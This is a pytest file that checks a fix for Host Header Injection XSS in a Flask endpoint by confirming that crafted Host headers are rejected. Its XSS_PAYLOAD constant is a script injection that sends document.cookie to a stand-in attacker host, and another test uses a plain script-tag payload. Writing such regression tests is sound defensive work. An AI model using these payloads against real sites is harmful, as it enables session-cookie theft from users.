"""
Proof tests for the Host Header Injection XSS fix in hhi.py.

Attack vector: POST /api/hhivuln with a crafted Host header containing
HTML/JS that breaks out of the <a href='...'> attribute context.

On the vulnerable code  → h is interpolated raw into the HTML response.
On the fixed code       → Host is validated against ALLOWED_HOSTS; unknown
                          hosts are rejected with 400 before any reflection.
                          Known-good hosts are further protected by html.escape.
"""

import flask
import pytest

from hhi import hhivuln, ALLOWED_HOSTS

XSS_PAYLOAD = "evil.com'><script>document.location='https://attacker.com?c='+document.cookie</script><a href='"
BENIGN_HOST = ALLOWED_HOSTS[0]  # use a known-good host from the allowlist


@pytest.fixture
def app():
    return flask.Flask(__name__)


def test_xss_payload_is_rejected(app):
    """
    The XSS payload host is not in ALLOWED_HOSTS and must be rejected (400)
    — it must never be reflected into the response body.

    This test FAILS on the vulnerable code (raw Host echoed into href)
    and PASSES on the fixed code (unknown host rejected before reflection).
    """
    with app.test_request_context(
        "/api/hhivuln",
        method="POST",
        headers={"Host": XSS_PAYLOAD},
    ):
        result, status = hhivuln(None)
        assert status == 400, f"XSS payload host must be rejected, got {status}"
        assert "<script>" not in result.get("msg", ""), (
            f"Raw <script> tag in response! Got: {result!r}"
        )


def test_benign_host_passes_through(app):
    """A host from ALLOWED_HOSTS is returned in the response without double-escaping."""
    with app.test_request_context(
        "/api/hhivuln",
        method="POST",
        headers={"Host": BENIGN_HOST},
    ):
        result, status = hhivuln(None)
        assert status == 200
        assert BENIGN_HOST in result["msg"]


def test_script_tag_in_host_not_reflected_raw(app):
    """A Host containing a bare <script> tag must be rejected, not reflected."""
    with app.test_request_context(
        "/api/hhivuln",
        method="POST",
        headers={"Host": "<script>alert(1)</script>"},
    ):
        result, status = hhivuln(None)
        assert status == 400, f"Script-tag host must be rejected, got {status}"
        assert "<script>" not in result.get("msg", ""), (
            f"Unescaped <script> reflected! Got: {result!r}"
        )
